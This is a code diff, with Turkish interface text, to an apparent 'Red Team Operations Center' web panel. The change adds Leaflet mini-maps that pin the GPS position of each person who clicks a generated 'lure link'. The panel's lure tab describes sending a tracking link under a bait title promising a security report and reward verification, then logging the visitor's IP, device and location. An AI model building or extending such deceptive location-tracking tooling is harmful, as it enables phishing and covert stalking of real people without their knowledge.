@@ -70,6 +70,9 @@ HTML_TEMPLATE = """
     <meta charset="UTF-8">
     <title>Kali Linux - Red Team Operations Center</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- Leaflet CSS ve JS (Mini Harita için) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
         .container { max-width: 1350px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
@@ -96,9 +99,10 @@ HTML_TEMPLATE = """
         .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
         .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
         table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
-        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; }
+        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
         th { background: #0284c7; color: white; }
         tr:hover { background: #161f30; }
+        .mini-map { width: 180px; height: 110px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
         .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
@@ -144,7 +148,7 @@ HTML_TEMPLATE = """
         <!-- Lure Link & Tracker Sekmesi -->
         <div id="lureTab" class="tab-content">
             <h3>🎯 Lure Link Generator & GPS/Device Tracker</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak takip linkini üretin. Ziyaretçi tıkladığında GPS konumu ve cihaz parmak izi otomatik toplanır.</p>
+            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak takip linkini üretin. Ziyaretçi tıkladığında GPS konumu mini haritada 📍 işaretiyle gösterilir.</p>
             <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
             <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
             <div class="form-group" style="margin-top: 20px;">
@@ -283,13 +287,26 @@ HTML_TEMPLATE = """
             let data = await res.json();
             let container = document.getElementById('clickLogsContainer');
             if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
-            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz</th><th>GPS Konum</th></tr></thead><tbody>`;
-            data.logs.forEach(l => { 
-                let loc = l.lat ? `<a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8;">Haritada Gör (${l.lat}, ${l.lon})</a>` : "Alınamadı";
-                html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td><td>${loc}</td></tr>`; 
+            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz</th><th>📍 GPS Mini Harita Konumu</th></tr></thead><tbody>`;
+            data.logs.forEach((l, index) => { 
+                let mapId = `map_${index}`;
+                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps'te Aç</a>` : "Konum İzni Alınamadı";
+                html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td><td>${locContent}</td></tr>`; 
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
+
+            // Tablo çizildikten sonra Leaflet haritalarını render et
+            data.logs.forEach((l, index) => {
+                if(l.lat && l.lon) {
+                    let mapId = `map_${index}`;
+                    setTimeout(() => {
+                        let map = L.map(mapId, {attributionControl: false, zoomControl: false}).setView([l.lat, l.lon], 14);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                        L.marker([l.lat, l.lon]).addTo(map).bindPopup("📍 Hedef Konum").openPopup();
+                    }, 100);
+                }
+            });
         }
         async function sendTelegramTest() {
             let chatId = document.getElementById('testChatId').value.trim();
